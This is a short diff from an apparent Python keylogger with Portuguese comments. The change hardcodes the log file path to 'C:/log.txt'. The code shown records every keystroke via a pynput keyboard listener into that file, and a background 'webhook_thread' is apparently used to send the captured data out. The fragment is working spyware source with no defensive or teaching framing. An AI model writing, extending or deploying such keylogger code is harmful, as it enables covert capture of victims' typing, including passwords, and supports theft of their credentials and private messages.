@@ -17,12 +17,12 @@ webhook_thread.daemon = True
 webhook_thread.start()
 print("Thread ativo")
 
-with open(caminho_log, 'w') as log:
+with open("C:/log.txt", 'w') as log:
     log.write('')
     print("criou o txt")
 
 def on_press(key):
-    with open(caminho_log, 'a') as log: 
+    with open("C:/log.txt", 'a') as log: 
         log.write(f'{key}\n')
 
 with pynput.keyboard.Listener(on_press=on_press) as listener:
